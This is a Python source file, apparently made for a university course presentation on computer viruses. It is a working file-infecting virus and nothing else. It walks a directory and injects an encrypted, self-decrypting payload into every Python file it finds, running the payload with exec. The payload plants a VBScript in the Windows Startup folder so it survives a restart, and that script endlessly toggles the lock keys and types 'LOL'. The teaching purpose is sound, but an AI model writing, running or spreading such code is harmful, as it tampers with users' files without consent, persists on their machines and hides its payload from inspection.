import getpass
import os
from cryptography.fernet import Fernet

# gets the username of the current logged in user to go to the filepath with files to infect
username = getpass.getuser()
# MAKE SURE TO CHANGE THIS FILEPATH TO THE REPOSITORY ON YOUR MACHINE IF THIS IS NOT THE FILEPATH
infectiondir = f"C:/Users/{username}/Documents/GitHub/UIdahoCS336VirusPresentation/ExampleScripts"

# gets a list of every file and folder in this directory
subdirs = os.walk(infectiondir, topdown=True, followlinks=False)
# look through every subdirectory
for d in subdirs:
	# look through every file in each directory
	for file in d[2]:
		# if that file is a python file, infect it
		if (file.endswith(".py")):
			infpath = f"{d[0]}/{file}"
			flines = []
			inflines = []
			# get a string list of every line in the file
			with open(infpath, "r") as inf:
				flines = inf.readlines()

			# copy over all the import lines
			while (flines[0].startswith("import ") or (flines[0].startswith ("from ") and "import " in flines[0]) or flines[0].startswith("#") or flines[0].startswith("\n") or flines[0].startswith("\t")):
				inflines.append(flines[0])
				flines.pop(0)
			
			# defines all of the lines of code that will actually do damage
			viruslines = ["import getpass\n"]
			viruslines.append("import getpass\n")
			viruslines.append("import os\n")
			viruslines.append("\n")
			viruslines.append("username = getpass.getuser()\n")
			viruslines.append("startupdir = f\"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\"\n")
			viruslines.append("filename = \"StartupController.vbs\"\n")
			viruslines.append("with open(f\"{startupdir}/{filename}\", \"w\") as file:\n")
			viruslines.append("\tfile.write(\"set output=wscript.createobject (\\\"wscript.shell\\\")\\n\")\n")
			viruslines.append("\tfile.write(\"do\\n\")\n")
			viruslines.append("\tfile.write(\"wscript.sleep 100\\n\")\n")
			viruslines.append("\tfile.write(\"output.sendkeys \\\"{CAPSLOCK}\\\"\\n\")\n")
			viruslines.append("\tfile.write(\"output.sendkeys \\\"{NUMLOCK}\\\"\\n\")\n")
			viruslines.append("\tfile.write(\"output.sendkeys \\\"{SCROLLLOCK}\\\"\\n\")\n")
			viruslines.append("\tfile.write(\"output.sendkeys \\\"LOL \\\"\\n\")\n")
			viruslines.append("\tfile.write(\"loop\")\n")
			viruslines.append("\n")
			viruslines.append("cwd = os.getcwd()\n")
			viruslines.append("os.chdir(startupdir)\n")
			viruslines.append("os.system(filename)\n")
			viruslines.append("os.chdir(cwd)\n")
			
			# puts all those lines of code into one string
			viruscode = ""
			for l in viruslines:
				viruscode += l
			
			# encrypts the string containing all of the code
			key = Fernet.generate_key()
			encrypter = Fernet(key)
			encryptedvirus = encrypter.encrypt(viruscode.encode())
			
			# put the virus code at the start of the file (right after all the import lines) that will decrypt and run the code that actually does damage
			inflines.append("# ------------------------ VIRUS STARTS HERE ------------------------\n")
			inflines.append("from cryptography.fernet import Fernet\n")
			inflines.append("\n")
			inflines.append(f"key = {key}\n")
			inflines.append(f"encryptedcode = {encryptedvirus}\n")
			inflines.append("decrypter = Fernet(key)\n")
			inflines.append("code = decrypter.decrypt(encryptedcode).decode()\n")
			inflines.append("exec(code)\n")
			inflines.append("# ------------------------ VIRUS ENDS HERE ------------------------\n")

			# copy over the rest of the file
			inflines.extend(flines)

			# write the lines from the file back into itself with the virus code injected
			with open(infpath, "w") as inf:
				for s in inflines:
					inf.write(s)